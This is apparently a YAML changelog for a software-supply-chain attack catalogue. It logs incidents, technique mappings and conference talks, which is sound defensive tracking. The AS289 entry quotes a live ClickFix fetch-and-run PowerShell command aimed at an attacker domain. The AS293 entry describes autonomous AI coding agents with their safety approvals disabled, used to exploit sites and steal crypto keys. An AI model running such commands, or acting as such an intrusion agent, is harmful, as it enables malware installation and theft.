entries:
- date: '2026-10-01'
  id: drop-oscar-page-copy
  title: OSC&R named only on the matrix page; talks are boxes
  items:
  - 'Guidance, incidents, stories, techniques, and origins no longer frame the site as OSC&R.
    The matrix page still says the catalogue uses OSC&R and maps incidents onto it.'
  - 'Conference talks use the same responsive box grid as platforms.'
- date: '2026-10-01'
  id: platform-boxes
  title: Platform index is a responsive grid of boxes
  items:
  - '/platforms/ is no longer a stack of full-width cards. Each platform is a box
    with its incident count. The grid wraps from one column on a phone to as many
    as fit.'
- date: '2026-10-01'
  id: drop-naked-counts
  title: Homepage no longer shows mitigation, detection, or platform counts
  items:
  - 'Those numbers had no page that explained the items. Mitigations and detections
    are IDs on technique pages only. The platform chart and /platforms/ lists stay;
    the bare count does not.'
- date: '2026-10-01'
  id: no-oscar-callouts
  title: Stop calling OSC&R out in site chrome
  items:
  - 'Banner, footer, homepage, and About no longer explain OSC&R or say it is one part
    of the catalogue. The matrix page says the catalogue uses OSC&R and maps incidents onto it.'
- date: '2026-09-30'
  id: cloudsek-agent-fleet
  title: Autonomous AI-agent crypto-theft fleet added (AS293, T0213)
  items:
  - 'AS293 CloudSEK AI-Agent-Driven Offensive Operation (19 Aug): an exposed operator
    staging host serving the full working home folder (21,442 directories, 142,262
    files) revealed two campaigns driven by an autonomous AI-agent fleet — Claude
    Code, Codex, and open-source Hermes and pi agents in full-auto mode with every
    safety approval disabled, tasked and monitored entirely over Telegram. Campaign
    1: internet-wide opportunistic exploitation (12,048 compromise records, 8,996
    sites, fastjson2 deserialization RCE kit, FOFA-corpus recon). Campaign 2: targeted
    crypto/DeFi theft (clone sites of a DeFi codebase — the one legitimate unmodified
    site returned 403 and leaked nothing; 2,250 real EVM/Solana wallet addresses with
    derivation paths; live paid Helius/QuickNode RPC keys extracted from client-side
    bundles and confirmed working in production). Platforms ai-agents/windows/linux;
    new technique T0213 (Orchestrate AI-agent fleet as the intrusion workforce) added
    with technique-origin entry — distinct from T0210 (poisoned agent config) and
    T0152 (hijacked live session). Deserialization RCE and blockchain C2 recorded
    as gaps, not force-mapped.'
  - 'Re-walked every track:true source. Everything else this window was already mapped
    or is defensive/product content: SafeDep Jev/Gryph agent-detection and Mini Shai-Hulud
    reinfection on AS197, sckit/MemTensor on AS39, OpenAI-agents RubyDoc proxy on
    AS37; ReversingLabs npm/Twilio campaign on AS38, Claude Code Security/agentic-permissioning/
    AI-cyber-spending essays; Checkmarx btree on AS25, JSX-to-SVG/React2Shell2 CVE
    product posts; OpenSourceMalware WeaselBiscuit on AS32, PolinRider A/B testing
    on AS35, show episodes; Morphisec polymorphic/fortibleed/signed-sealed essays
    and product posts; Wiz Artifactory on AS190, AWS sign-up/LiteLLM Off Guard/agent-intent
    engine and honeypot product/research; Google Threat Intelligence topics feed (ShinyHunters
    Oracle PeopleSoft/PeopleSoft war, GTIG AI tracker, UNC7005/UNC5976 phishing) is
    credential/endpoint activity, not software-supply-chain attacks; GitHub changelog
    platform features (proof-of-presence, stage-only npm tokens, workflow execution
    protections, credential inventory exports); CISA KEV catalog adds and token-protection
    publications; Sansec ClickFix clipboard hijacker (endpoint, same class as AS289/AS194);
    Rust and RubyGems blog items (Cargo CVE advisories, May spam-publishing campaign
    update already on AS37); CrowdStrike ClickFix explainer and SafeMind product posts.'
- date: '2026-09-29'
  id: virtualizor-bgp-hijack
  title: Virtualizor BGP-hijack update attack and Microsoft counterfeit installers added (AS291, AS292)
  items:
  - 'AS291 Virtualizor/Softaculous BGP hijack (BleepingComputer, 28–30 Aug; Softaculous
    advisory): a BGP route hijack of a Hetzner IP block rerouted Virtualizor update/billing
    requests to attacker servers, delivering a malicious update package with persistence
    at /etc/systemd/system/java-jre-update.service; Softaculous now signs all packages.
    Platforms linux/windows; new technique T0212 (Subvert network routing to intercept
    update traffic) added with technique-origin entry, plus T0180/T0121 for the supply-chain
    stage and T0159/T0148/T0184 on the host.'
  - 'AS292 Microsoft counterfeit-installer campaign (Microsoft Defender Experts, 1 Sep):
    vendor-look-alike download sites (.com.cn/.hl.cn, Razer/Edge/Kaspersky/Baidu et al.,
    moderate-confidence Silver Fox/Yinhu) deliver installer archives whose families
    (app_setup.*, zinst.*, zintall.*, intsoft.*, innstll.*) keep the same filename while
    contents regenerate server-side per download, defeating URL/hash reputation; randomized-path
    stage-one with stable hash, fabricated version metadata with unfilled TODO placeholder,
    repurposed TrueUpdate runtime fetching from Alibaba Cloud OSS. Platforms windows/cdn;
    T0136/T0110/T0207 for the distribution stage, T0159/T0148/T0176/T0184 on the victim
    machine. Server-side regeneration recorded as a gap, not force-mapped.'
  - 'Re-walked every track:true source. Everything else this window was already mapped
    (Aikido Shai-Hulud 111-day reactivation and Clean-Release resurfaces on AS48/AS16,
    OX PhantomSub Baileys spam-subscribe on AS85, ReversingLabs OpenAI/HF mob-agent
    postmortem on AS16/TanStack + AS26/PhantomRaven references, StepSecurity sckit/MemTensor
    on AS39, CloudSEK BRIDGEHEAD/TXTBOOK/LiteLLM on AS114/AS115/AS17, Wiz Artifactory
    on AS190, Aikido Graphalgo on AS40, Aikido XCSSET Flutter on AS116, Socket PolinRider
    Packagist on AS35, Morphisec polymorphic/fortibleed essays and product posts, GitHub
    changelog platform security defaults, CISA advisories, RubyGems/Rust blog items)
    or is defensive research, show episodes, and advisory items, already classified.'
- date: '2026-09-27'
  id: revstealer-morphisec
  title: RevStealer fake-Claude Electron stealer added (AS290)
  items:
  - 'AS290 RevStealer (Morphisec Threat Labs, 31 Aug): Windows infostealer inside
    trojanized Electron apps distributed from GitHub repositories and game-cheat
    sites; notable lure a fake “Claude Opus 5 Free Desktop” project impersonating
    Anthropic and advertising free access to a paid model. Platforms
    git/windows/ai-agents; T0110/T0136/T0197 for the distribution stage,
    T0159/T0184 for the victim machine. Encrypted exfil and self-deletion
    recorded as gaps, not force-mapped.'
  - 'Re-walked every track:true source. Everything else this window was already
    mapped (SafeDep actions-cool reinfection on AS197, Checkmarx npm btree on
    AS25, CrowdStrike PhantomRaven September follow-up and PyPI twin on AS26,
    SafeDep OpenAI-agents RubyDoc proxy on AS37, sckit MemTensor 23 Sept on AS39,
    PolinRider Packagist on AS35, tw-pkgprobe-7731 on AS38, WeaselBiscuit on
    AS32, Brevo Cloudflare Worker on AS19, Rust targeted-attacks on AS18) or is
    product posts, show episodes, defensive research, and advisory items,
    already classified.'
- date: '2026-09-26'
  id: defcon-2021-2025-talks
  title: DEF CON 29–33 supply-chain and AI talks scanned
  items:
  - 'Walked DEF CON 29, 31, 32, and 33 speaker pages, and the DEF CON 30 presentation
    index (speakers page 404s). Added 16 talks to content/portal/talks.yaml. Technique
    IDs only where the abstract describes that technique.'
  - 'Mapped: GitHub Actions Worm (T0122/T0169), VS Code Workspace Trust (T0152), XZ
    backdoor story (T0111/T0121), Grand Theft Actions (T0132/T0111), OH-MY-DC (T0183),
    CloudQuarry (T0103), tj-actions reconstruction (T0122), abandoned S3 buckets (T0205).'
  - 'Recorded, not mapped: pickle/ONNX/TorchScript model-file talks, Gemini calendar
    promptware, Copilot data-void C2, solar firmware supply chain, SAST-scanner RCE in CI.
    No technique names a malicious model file or a scanner-as-execution primitive.'
  - 'Reviewed and left out: IDE product bugs (Worming through IDEs), tractor/farm device
    talks, browser-extension API bugs, Defender update hijack, Windows Downdate, Llama 3
    red-team process. Not this field.'
  - 'Black Hat USA/EU/Asia 2021–2025 not added. Schedule pages are Cloudflare-blocked
    from here, and the extract that gets through returns session times without titles.
    USA 2026 remains the only Black Hat walk with named talks.'
- date: '2026-09-26'
  id: defcon34-talks-catalog
  title: DEF CON 34 talks catalogued; two new mappings, four recorded as gaps
  items:
  - 'Talks are entries in content/portal/talks.yaml, rendered at /talks.html. Not attack stories.
    A technique ID is set only when the abstract describes that technique.'
  - 'Mapped: “Your WAF Blocked Us” (Sternberg/Poran/Bobrov) onto T0210 — Sentry Seer poisons Cursor,
    persistence is config poisoning. “Hacking the Hackers who Hack Hackers” (Morag, FirewallFalcon)
    onto T0110 and T0197 — Telegram-advertised OSS tool installed outside a registry, ships a backdoor.
    Not T0109 (no registry upload) and not T0138 (not a commit into someone else''s repo).'
  - 'Recorded, not mapped: OffGuard (LiteLLM MCP auth bypass / sandbox escape / SSRF — no technique
    for an AI-gateway control plane), One Chain to Own Them All (torch.load of attacker weights,
    CVE-2026-24747 — not a registry publish), Breaking Local AI Runtimes (llama.cpp/Ollama memory
    corruption; the abstract says it is not prompt injection), Data Tomb Raider (M365 Copilot
    parameter-to-prompt — not T0210).'
  - Previously named DEF CON 34 and Black Hat USA 2026 talks are in the same catalog, with per-talk
    anchors where the speakers page has them. Black Hat entries still point at the schedule index.
- date: '2026-09-26'
  id: placeholder-domain-clickfix
  title: Placeholder domain third-party.com turned live ClickFix server (AS289)
  items:
  - 'New AS289 (Manifold Security): third-party[.]com — a documentation placeholder in 1,500+ files
    across 1,700+ repositories (Chromium docs, Sanity/Vercel skills, MCP-server docs) — is not
    IANA-reserved and was registered by someone else. Since at least June 2026 it has served a
    Windows-gated ClickFix lure (fake Cloudflare check, clipboard poisoning, Win+R → PowerShell
    irm elxxvvx[.]xyz/f | iex). macOS/Linux crawlers get a benign decoy, so reputation feeds and
    static checks see nothing; IPFire listed and de-listed it in July for exactly that reason.
    Platforms: cdn, ai-agents, windows.'
  - 'Follow-up (24 Sep, same team) attached: 350,000+ GitHub files cite placeholder domains serving
    scams — parking pages your-domain[.]com / yoursite[.]com served macOS scareware and counterfeit
    BBC/ZDF investment-fraud pages in 2 of 16 macOS renders; every static check cleared them.'
  - 'OSM PolinRider A/B-testing follow-up (26 Sep) attached to AS35: force-pushed fa-solid-500.woff2
    (3 Sep) and fa-solid-900.woff2 (25 Sep, all three Binary-Mindz repos within eight minutes) variants
    evade keyword detections; 853 recovered force-pushes document the 8-month infection.'
  - 'Socket “Happy Birthday, Shai-Hulud” one-year retrospective (18 Sep) attached to AS48 — same
    incident, retrospective coverage.'
